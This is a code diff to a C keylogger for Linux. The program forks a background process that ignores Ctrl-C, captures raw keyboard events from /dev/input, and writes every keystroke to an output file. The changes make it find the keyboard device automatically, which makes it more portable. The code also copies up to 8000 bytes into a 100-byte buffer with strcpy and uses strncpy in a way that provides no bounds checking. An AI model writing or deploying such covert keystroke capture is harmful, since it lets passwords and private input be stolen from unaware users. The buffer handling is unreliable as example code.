@@ -6,8 +6,9 @@
 #include <linux/input.h>
 #include <fcntl.h>
 #include <signal.h>
+#include <dirent.h>
 
-#define KEYBOARD_DEV_FILE "/dev/input/by-path/platform-i8042-serio-0-event-kbd"
+#define MAXLINE 8192
 
 static const char *keycodes[] =
     {
@@ -41,6 +42,29 @@ static const char *shifted_keycodes[] =
 
 int loop_ctrl;
 
+void get_keyboard_file(char *kbdfile)
+{
+    DIR *d;
+    struct dirent *dir;
+    char buffer[8000];
+    char dr[] = "/dev/input/by-path/";
+    d = opendir(dr);
+    if (d)
+    {
+        while ((dir = readdir(d)) != NULL)
+        {
+            if (strstr(dir->d_name, "kbd"))
+            {
+                snprintf(buffer, 8000, "%s%s", dr, dir->d_name);
+                printf("%s\n", buffer);
+                strcpy(kbdfile, buffer);
+                break;
+            }
+        }
+        closedir(d);
+    }
+}
+
 void writer(int output_fd, const char *strToWrite)
 {
     int written = 0;
@@ -61,6 +85,9 @@ void writer(int output_fd, const char *strToWrite)
 
 void keylogger(int output_fd)
 {
+    char KEYBOARD_DEV_FILE[100];
+    get_keyboard_file(KEYBOARD_DEV_FILE);
+    char buf[MAXLINE];
     if (!fork())
     {
         signal(SIGINT, SIG_IGN);
@@ -82,6 +109,8 @@ void keylogger(int output_fd)
                 {
                     if (event[i].code == KEY_ESC)
                     {
+                        close(key_dev_fd);
+                        close(output_fd);
                         return;
                     }
                     if ((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT))
@@ -90,12 +119,14 @@ void keylogger(int output_fd)
                     }
                     if (shift && !((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT)))
                     {
-                        writer(output_fd, shifted_keycodes[event[i].code]);
+                        strncpy(buf, shifted_keycodes[event[i].code], strlen(shifted_keycodes[event[i].code]) + 1);
+                        writer(output_fd, buf);
                         writer(output_fd, "\n");
                     }
                     if (!shift && !((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT)))
                     {
-                        writer(output_fd, keycodes[event[i].code]);
+                        strncpy(buf, keycodes[event[i].code], strlen(keycodes[event[i].code]) + 1);
+                        writer(output_fd, buf);
                         writer(output_fd, "\n");
                     }
                 }
